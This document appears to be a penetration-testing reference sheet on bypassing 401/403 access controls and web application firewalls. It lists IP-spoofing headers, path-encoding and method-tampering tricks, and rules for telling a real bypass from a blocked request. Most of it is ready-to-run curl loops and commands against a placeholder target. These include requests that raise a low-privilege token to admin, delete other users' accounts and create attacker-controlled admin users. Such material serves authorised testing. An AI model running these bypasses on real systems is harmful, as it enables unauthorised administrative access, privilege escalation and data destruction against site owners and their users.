# 403 / 401 Bypass Matrix

Run against every 401/403 endpoint (`assets/live-auth.txt` + any gated path found in Phases 2/4). A
bypass that lands in `/admin`, `/api/internal/*`, or `/debug` chains straight into IDOR/RCE/data exposure.

## Fingerprint the WAF first
`cf-ray` → Cloudflare · `x-amzn` → AWS WAF · `TS…` cookie → F5 BIG-IP · `incap_ses` → Imperva.
Use `wafw00f <url>` when installed. Vendor dictates which tricks land.

## Technique classes
| Class | Try |
|---|---|
| **IP-spoof headers** | `X-Forwarded-For: 127.0.0.1`, `True-Client-IP`, `CF-Connecting-IP`, `X-Originating-IP`, `X-Remote-Addr`, `X-Remote-IP`, `X-Client-IP`, `Forwarded: for=127.0.0.1`, `Via`, `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` |
| **Path tricks** | `/%2e/admin`, `/%252e/admin`, `/admin/.`, `/admin/`, `/admin//`, `//admin`, `/./admin`, `/admin;/`, `/admin..;/`, `/admin%20`, `/admin%09`, `/admin%00` |
| **Suffix tricks** | `/admin.json`, `/admin.html`, `/admin.css`, `/admin#`, `/admin?` |
| **Method tamper** | swap GET→`POST`/`PUT`/`PATCH`/`TRACE`/`HEAD`; `X-HTTP-Method-Override: GET` on a POST-only guard |
| **Content-Type confusion** | `application/json` vs `multipart/form-data`; dual Content-Type header |
| **Vendor-specific** | Cloudflare: TE + `X-Forwarded-Host`. AWS WAF: `/**/` comment split. Imperva: `%c0%2e` unicode dot. F5: double-slash path. |

## Verdict logic (don't trust raw status)
WAFs return **200** with a challenge/block page to hide blocking. Sample a "block baseline" (a known-bad
XSS payload) first, then:
- `bypassed` = status ∈ {200,201,204,301,302,401,500,502,503} AND body ≠ block baseline AND no vendor signature.
- `needs_review` = status OK but body ambiguous.
- `blocked` = body matches vendor signature OR length ≈ baseline (±5%).
**401 and 500 are wins** — the request reached the backend past the WAF edge. Extract any WAF Log/Incident
ID from the block page and include it in the report (triage can look up the exact rule that fired).

## curl probe loop
```bash
U=https://target.com/admin
for H in "X-Forwarded-For: 127.0.0.1" "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "True-Client-IP: 127.0.0.1"; do
  echo "== $H =="; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" -H "$H" "$U"
done
for P in "/%2e/admin" "/admin/." "//admin" "/admin..;/" "/admin.json" "/admin%20"; do
  curl -s -o /dev/null -w "%{http_code} %{size_download} $P\n" "https://target.com$P"
done
for M in POST PUT PATCH TRACE HEAD; do curl -s -o /dev/null -w "%{http_code} $M\n" -X $M "$U"; done
```

## Payload-level WAF bypass (when a keyword, not a path, is blocked)
URL-encode 1–3 layers, unicode escape, HTML entity, SQL inline comment (`/*!50000SELECT*/`), MySQL
version comment, case-mixing, operator substitution, base64 XSS wrapper, null-byte insertion. See
[payloads.md](payloads.md) for the raw strings.

## Function-level BAC (BFLA) — beyond WAF/edge bypass
This is a different problem than the sections above: the request reaches the app fine, no WAF is
involved, and the backend itself makes the wrong call about whether your role may invoke this function.
- **Client-trusted role/plan/entitlement** — role, subscription tier, or feature-flag stored in a JWT
  claim, `localStorage`, or a client-editable cookie, with the backend trusting it instead of
  re-verifying server-side. Re-sign the JWT if `alg:none`/weak-secret works ([auth-attacks.md](auth-attacks.md)),
  or just edit the cookie directly and replay.
- **API-version / channel parity gap** — the same underlying action is reachable via `/v1/`, `/api/`,
  `/mobile/`, `/internal/`, or a GraphQL mutation, each wired to authz independently. Enumerate every
  channel that reaches the same action and test each — the oldest one is usually the weakest.
- **Workflow step-skipping** — jump straight to a later step's endpoint in a multi-step wizard/approval
  flow (`POST /orders/{id}/ship` without ever calling `/approve`) to reach a privileged state without the
  gating step ever firing.
- **Admin-route discovery via JS bundle** — SPA router config (React Router / Vue Router route arrays) in
  the JS bundle enumerates every admin route even when none are linked in the rendered UI for your role —
  cross-reference with [js-mining.md](js-mining.md)'s `admin-refs.txt`, then hit each route directly.
- **Front-end-only restriction** — a disabled button, hidden menu item, or greyed-out feature is not a
  server-side check. Always replay the underlying request directly regardless of what the UI renders for
  your role — the simplest BAC bypass, and still the most commonly missed.
- **CORS-enabled BAC** — an endpoint that's "internal-only by convention" (never linked, not IP-restricted)
  but carries a permissive CORS policy turns an assumed same-origin access boundary into a cross-origin-
  readable one. Test CORS headers on undocumented/internal-looking endpoints specifically, not just public ones.

---

## FUNCTION-LEVEL / VERB AUTHZ GAPS

### Hidden Verb Discovery via OPTIONS
```bash
# OPTIONS request reveals allowed verbs — includes ones the UI never uses:
curl -si -X OPTIONS https://target.com/api/users/123 | grep -i "allow\|access-control-allow-methods"
# Also: Access-Control-Allow-Methods header on CORS preflight reveals hidden verbs
# For each discovered verb: PUT, PATCH, DELETE, HEAD, PROPFIND, MOVE, COPY
curl -X PUT https://target.com/api/users/VICTIM_ID \
  -H "Authorization: Bearer ATTACKER_TOKEN" \
  -d '{"role":"admin"}'
curl -X DELETE https://target.com/api/users/VICTIM_ID \
  -H "Authorization: Bearer ATTACKER_TOKEN"
```

### X-HTTP-Method-Override / _method
```bash
# When endpoint is POST-only and the auth check only fires on POST:
curl -X POST https://target.com/api/admin/action \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer LOW_PRIV_TOKEN" \
  -d "user_id=VICTIM"
# Also: _method in form body
curl -X POST https://target.com/api/admin/action \
  -d "_method=DELETE&user_id=VICTIM"
```

### Content-Type Switch Bypasses Auth Filter
```bash
# JSON endpoint authz filter checks Content-Type: application/json
# Skip by sending non-JSON content type:
curl -X POST https://target.com/api/admin/create-user \
  -H "Authorization: Bearer LOW_PRIV_TOKEN" \
  -H "Content-Type: text/plain" \
  -d '{"role":"admin","email":"attacker@evil.com"}'
curl -X POST https://target.com/api/admin/create-user \
  -H "Authorization: Bearer LOW_PRIV_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "role=admin&email=attacker@evil.com"
# Also: charset variant
-H "Content-Type: application/json; charset=ibm500"
```

### Internal Identity Headers (Gateway-Assumed)
```bash
# Reverse proxies / API gateways sometimes strip these but app trusts them if present:
curl https://target.com/api/profile \
  -H "X-User-Id: ADMIN_USER_ID"
curl https://target.com/api/profile \
  -H "X-User-Role: admin"
curl https://target.com/api/profile \
  -H "X-Authenticated-User: admin@target.com"
curl https://target.com/api/profile \
  -H "X-Auth-User: ADMIN_UUID"
curl https://target.com/api/profile \
  -H "X-Internal: true"
curl https://target.com/api/profile \
  -H "X-Forwarded-User: admin"
```

### Catch-All Router False Positive Kill
```bash
# BEFORE claiming a 200 as a bypass — verify it's not the SPA shell:
curl -si https://target.com/admin/secret | head -5
# Vulnerable: Content-Type: application/json with real data
# False positive: Content-Type: text/html with <html><head><title>App</title>...
# The SPA returns 200 for ALL paths — only the response BODY content confirms a real bypass
```

---

## PATH & HEADER BYPASS ADDITIONS

### IP Authorization Header Set
```bash
# Try each independently — some gateways add only one of these:
curl https://target.com/admin \
  -H "X-Custom-IP-Authorization: 127.0.0.1"
curl https://target.com/admin \
  -H "X-Forwarded-For: 127.0.0.1"
curl https://target.com/admin \
  -H "X-Forwarded-For: REAL_IP, 127.0.0.1"   # 127.0.0.1 as LAST value
curl https://target.com/admin \
  -H "X-Real-IP: 127.0.0.1"
curl https://target.com/admin \
  -H "Client-IP: 127.0.0.1"
curl https://target.com/admin \
  -H "X-ProxyUser-Ip: 127.0.0.1"
curl https://target.com/admin \
  -H "True-Client-IP: 127.0.0.1"
curl https://target.com/admin \
  -H "Forwarded: for=127.0.0.1"
```

### Path Case & Encoding Variants
```bash
BASE="https://target.com"
# Case:
curl $BASE/Admin
curl $BASE/ADMIN
# Double-URL encode:
curl "$BASE/%2561dmin"        # %25 = % → %%61 → %61 → a → /admin
curl "$BASE/%252fadmin"       # double-encoded slash
# Trailing control chars:
curl "$BASE/admin%20"         # trailing space
curl "$BASE/admin%09"         # trailing tab
curl "$BASE/admin%00"         # null byte
# Double slash + dot:
curl "$BASE//admin"
curl "$BASE/./admin"
curl "$BASE/admin/."
# Spring + Tomcat:
curl "$BASE/admin;jsessionid=1"
curl "$BASE/admin;x=y"
```

### HTTP Version Differential
```bash
# Some authz middleware only processes HTTP/1.1 requests:
# HTTP/1.0 request may bypass:
curl --http1.0 https://target.com/admin
# HTTP/2 path normalization may differ:
curl --http2 https://target.com/%2fadmin
# HTTP/3 (QUIC) — test if the endpoint is reachable:
curl --http3 https://target.com/admin
```
